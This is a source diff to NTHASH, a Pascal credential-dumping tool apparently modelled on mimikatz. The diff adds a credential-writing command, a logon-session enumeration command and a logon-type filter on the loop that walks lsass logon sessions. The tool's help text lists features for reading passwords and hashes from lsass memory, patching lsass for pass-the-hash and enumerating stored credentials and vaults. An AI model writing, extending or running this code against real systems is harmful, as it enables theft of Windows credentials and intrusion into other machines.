@@ -10,7 +10,7 @@ program NTHASH;
 uses windows, classes, sysutils, dos, usamlib, usid, uimagehlp, upsapi,
   uadvapi32, untdll, utils, umemory, ucryptoapi, usamutils, uofflinereg,
   uvaults, uLSA, uchrome, ufirefox, urunelevatedsupport, wtsapi32, uwmi, base64,
-  udpapi,udebug,injection;
+  udpapi,udebug,injection, usecur32;
 
 
 //***************************************************************************
@@ -274,6 +274,7 @@ var
   credhist:tDPAPI_CREDHIST;
   pb:pbyte;
   inhandle,hmod,ProcessHandle:thandle;
+  list:TStringList;
   label fin;
 
 
@@ -603,7 +604,11 @@ begin
                    while _KIWI_MSV1_0_LIST_63 (logsesslist ).flink<>offset do
                    begin
                    //log('entry#this:'+inttohex(i_logsesslist (logsesslist ).this ,sizeof(pointer)),0) ;
-                   if (luid=0) or (luid=_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart) then
+                   if ((luid=0) or (luid=_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart))
+                         and ((_KIWI_MSV1_0_LIST_63 (logsesslist ).LogonType=2)
+                           or (_KIWI_MSV1_0_LIST_63 (logsesslist ).LogonType=10)
+                           or (_KIWI_MSV1_0_LIST_63 (logsesslist ).LogonType=11)
+                           or (_KIWI_MSV1_0_LIST_63 (logsesslist ).LogonType=12)) then
                    begin
                    log('**************************************************',1);
                    if func<>nil then fn(func)(pointer(@logsesslist[0]) );
@@ -1033,9 +1038,11 @@ begin
   log('NTHASH /getlsakeys [/symbol]',1); //will read mem
   log('NTHASH /wdigest [/symbol]',1);  //will read mem
   log('NTHASH /wdigeston [/symbol]',1);  //will read mem
+  log('NTHASH /enumlogonsessions',1); //will read mem
   log('NTHASH /logonpasswords [/symbol]',1); //will read mem
   log('NTHASH /pth /user:username /password:myhash /domain:mydomain',1); //will patch lsass
   log('NTHASH /showkeymgr',1);
+  log('NTHASH /writecred',1);
   log('NTHASH /enumcred',1);
   log('NTHASH /enumcred2',1); //will patch lsass
   log('NTHASH /enumvault',1);
@@ -1303,6 +1310,13 @@ if p>0 then
    uvaults.Vaultenum ;
    goto fin;
    end;
+p:=pos('/writecred',cmdline);
+if p>0 then
+   begin
+   if credwrite (widestring(input),widestring(user),widestring(password))=false
+         then log('credwrite failed',1)
+         else log('credwrite ok',1);
+   end;
 p:=pos('/enumcred',cmdline);
 if p>0 then
    begin
@@ -1336,6 +1350,12 @@ if p>0 then
    begin
    if findlsakeys (lsass_pid,deskey,aeskey,iv )=false then begin log('findlsakeys failed',1);exit; end;
    dpapi (lsass_pid );
+   goto fin;
+   end;
+p:=pos('/enumlogonsessions',cmdline);
+if p>0 then
+   begin
+   GetActiveUserNames();
    goto fin;
    end;
 p:=pos('/logonpasswords',cmdline);
